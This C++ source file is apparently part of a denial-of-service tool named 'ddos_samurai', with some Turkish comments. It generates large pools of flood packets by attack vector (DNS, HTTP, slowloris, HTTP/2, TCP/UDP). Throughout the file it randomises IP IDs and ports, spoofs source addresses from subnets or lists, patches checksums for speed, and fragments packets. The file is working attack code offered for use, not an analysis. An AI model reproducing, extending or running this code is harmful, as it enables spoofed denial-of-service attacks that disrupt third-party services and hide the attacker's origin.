#include "engine.hpp"
#include "detail.hpp"

namespace ddos_samurai::cpu_native {
using namespace detail;

using PacketBuilder = std::vector<uint8_t> (*)(const PacketConfig&);

// Tek kaynak: paket üretim havuzu. (Yol B konsolidasyonu — engine.cpp'nin
// canlı by-value sürümü kanonik alındı; zero-copy denemesi gölgede/test
// edilmemişti, davranışı korumak için by-value tercih edildi.)
static PacketBuilder resolve_packet_builder(const PacketConfig& cfg) {
  const std::string vector = to_lower(cfg.attack_vector);
  if (vector == "dns") return build_dns_packet;
  if (vector == "http" || vector == "slowloris" || vector == "http2") return build_polymorphic_http_packet;
  return build_transport_packet;
}

std::tuple<std::shared_ptr<std::vector<uint8_t>>, size_t> generate_packet_pool_impl(const PacketConfig& cfg,
                                                                                     int count,
                                                                                     bool uniform_size,
                                                                                     bool /*low_peak_memory*/) {
  if (count <= 0) return {std::make_shared<std::vector<uint8_t>>(), 0};

  auto storage = std::make_shared<std::vector<uint8_t>>();
  const std::string vector = to_lower(cfg.attack_vector);

  // Resolve builder once (branch prediction optimization).
  PacketBuilder builder = resolve_packet_builder(cfg);

  // Polymorphic packets cannot be easily mutated due to varying sizes and payloads.
  bool can_mutate = uniform_size && (vector != "http" && vector != "slowloris" && vector != "http2" && vector != "dns");

  if (can_mutate) {
    auto template_pkt = builder(cfg);
    size_t pkt_size = (template_pkt.size() + 3u) & ~3u;
    storage->assign(static_cast<size_t>(count) * pkt_size, 0);

    const int ihl = (template_pkt[0] & 0x0F) * 4;
    const uint8_t proto = template_pkt[9];

    for (int i = 0; i < count; ++i) {
      size_t offset = static_cast<size_t>(i) * pkt_size;
      std::copy(template_pkt.begin(), template_pkt.end(), storage->data() + offset);

      if (i == 0) continue; // First packet is already perfect

      uint8_t* pkt_ptr = storage->data() + offset;

      // Mutate IP ID
      uint16_t old_id = read_be16(pkt_ptr + 4);
      uint16_t new_id = static_cast<uint16_t>(rand_int(1, 0xFFFF));
      write_be16(pkt_ptr, 4, new_id);

      uint16_t ip_csum = read_be16(pkt_ptr + 10);
      ip_csum = checksum_update(ip_csum, old_id, new_id);

      // Mutate source IP if spoofing
      uint32_t new_src_ip = 0;
      uint32_t old_src_ip = (static_cast<uint32_t>(pkt_ptr[12]) << 24) | (static_cast<uint32_t>(pkt_ptr[13]) << 16) | (static_cast<uint32_t>(pkt_ptr[14]) << 8) | pkt_ptr[15];

      if (cfg.spoof) {
          const std::string new_src = get_spoofed_ip(cfg.spoof_opts.mode, cfg.spoof_opts.subnet, cfg.spoof_opts.list_file);
          new_src_ip = static_cast<uint32_t>(ip_to_int(new_src));

          pkt_ptr[12] = (new_src_ip >> 24) & 0xFF;
          pkt_ptr[13] = (new_src_ip >> 16) & 0xFF;
          pkt_ptr[14] = (new_src_ip >> 8) & 0xFF;
          pkt_ptr[15] = new_src_ip & 0xFF;

          ip_csum = checksum_update_32(ip_csum, old_src_ip, new_src_ip);
      }
      write_be16(pkt_ptr, 10, ip_csum);

      // Mutate L4
      if (proto == PROTO_TCP) {
          uint16_t old_port = read_be16(pkt_ptr + ihl);
          uint16_t new_port = static_cast<uint16_t>(rand_int(1024, 65535));
          write_be16(pkt_ptr, ihl, new_port);

          uint16_t tcp_csum = read_be16(pkt_ptr + ihl + 16);
          tcp_csum = checksum_update(tcp_csum, old_port, new_port);
          if (cfg.spoof) tcp_csum = checksum_update_32(tcp_csum, old_src_ip, new_src_ip);

          write_be16(pkt_ptr, ihl + 16, tcp_csum);
      } else if (proto == PROTO_UDP) {
          uint16_t old_port = read_be16(pkt_ptr + ihl);
          uint16_t new_port = static_cast<uint16_t>(rand_int(1024, 65535));
          write_be16(pkt_ptr, ihl, new_port);

          uint16_t udp_csum = read_be16(pkt_ptr + ihl + 6);
          if (udp_csum != 0) {
              udp_csum = checksum_update(udp_csum, old_port, new_port);
              if (cfg.spoof) udp_csum = checksum_update_32(udp_csum, old_src_ip, new_src_ip);
              write_be16(pkt_ptr, ihl + 6, udp_csum == 0 ? 0xFFFF : udp_csum);
          }
      }
    }
    return {storage, pkt_size};
  }

  // Fallback for polymorphic / un-mutable packets
  size_t pkt_size = 0;
  std::vector<std::vector<uint8_t>> packets;
  packets.reserve(static_cast<size_t>(count));
  for (int i = 0; i < count; ++i) {
    auto pkt = builder(cfg);
    if (uniform_size) pkt_size = std::max(pkt_size, (pkt.size() + 3u) & ~3u);
    packets.push_back(std::move(pkt));
  }

  if (!uniform_size) {
    size_t total = 0;
    for (const auto& pkt : packets) total += pkt.size();
    storage->reserve(total);
    for (const auto& pkt : packets) storage->insert(storage->end(), pkt.begin(), pkt.end());
    return {storage, 0};
  }

  storage->assign(static_cast<size_t>(count) * pkt_size, 0);
  for (int i = 0; i < count; ++i) {
    std::copy(packets[static_cast<size_t>(i)].begin(),
              packets[static_cast<size_t>(i)].end(),
              storage->begin() + static_cast<ptrdiff_t>(static_cast<size_t>(i) * pkt_size));
  }
  return {storage, pkt_size};
}

PacketPoolBuffer generate_packet_pool_view(const PacketConfig& cfg,
                                           int count,
                                           bool uniform_size,
                                           bool low_peak_memory) {
  auto [storage, pkt_size] = generate_packet_pool_impl(cfg, count, uniform_size, low_peak_memory);
  return PacketPoolBuffer(storage, pkt_size);
}

std::pair<std::vector<uint8_t>, size_t> generate_packet_pool(const PacketConfig& cfg,
                                                             int count,
                                                             bool uniform_size,
                                                             bool low_peak_memory) {
  auto [storage, pkt_size] = generate_packet_pool_impl(cfg, count, uniform_size, low_peak_memory);
  return {*storage, pkt_size};
}

std::vector<std::vector<uint8_t>> fragment_packet(const std::vector<uint8_t>& packet, int fragment_size) {
  if (packet.size() < 20) return {packet};

  const int ihl = (packet[0] & 0x0F) * 4;
  const size_t total_len = std::min<size_t>(read_be16(packet.data() + 2), packet.size());
  if (total_len <= static_cast<size_t>(ihl)) {
    return {std::vector<uint8_t>(packet.begin(), packet.begin() + ihl)};
  }

  const std::vector<uint8_t> ip_header(packet.begin(), packet.begin() + ihl);
  const std::vector<uint8_t> payload(packet.begin() + ihl, packet.begin() + total_len);
  if (static_cast<int>(payload.size()) <= fragment_size) {
    return {std::vector<uint8_t>(packet.begin(), packet.begin() + total_len)};
  }

  fragment_size = std::max(8, (fragment_size / 8) * 8);
  const uint16_t base_flags_frag = read_be16(packet.data() + 6);
  const uint16_t base_offset = static_cast<uint16_t>(base_flags_frag & 0x1FFFu);
  const uint16_t preserved_flags = static_cast<uint16_t>(base_flags_frag & 0xC000u);

  std::vector<std::vector<uint8_t>> frags;
  for (size_t offset = 0; offset < payload.size(); offset += static_cast<size_t>(fragment_size)) {
    const size_t chunk_len = std::min(static_cast<size_t>(fragment_size), payload.size() - offset);
    const bool is_last = (offset + chunk_len) >= payload.size();
    std::vector<uint8_t> frag = ip_header;
    const uint16_t flags = static_cast<uint16_t>(preserved_flags | (is_last ? 0 : 0x2000u) | (base_offset + (offset / 8u)));
    write_be16(frag, 6, flags);
    write_be16(frag, 2, static_cast<uint16_t>(ihl + chunk_len));
    write_be16(frag, 10, 0);
    write_be16(frag, 10, checksum(frag.data(), frag.size()));
    frag.insert(frag.end(),
                payload.begin() + static_cast<ptrdiff_t>(offset),
                payload.begin() + static_cast<ptrdiff_t>(offset + chunk_len));
    frags.push_back(std::move(frag));
  }
  return frags;
}

std::vector<uint8_t> add_ethernet_frame(const std::vector<uint8_t>& ip_packet,
                                        const std::vector<uint8_t>& dst_mac,
                                        const std::vector<uint8_t>& src_mac) {
  auto eth = build_ethernet_header(dst_mac, src_mac, ETHERTYPE_IPV4_LOCAL);
  eth.insert(eth.end(), ip_packet.begin(), ip_packet.end());
  return eth;
}
}  // namespace ddos_samurai::cpu_native
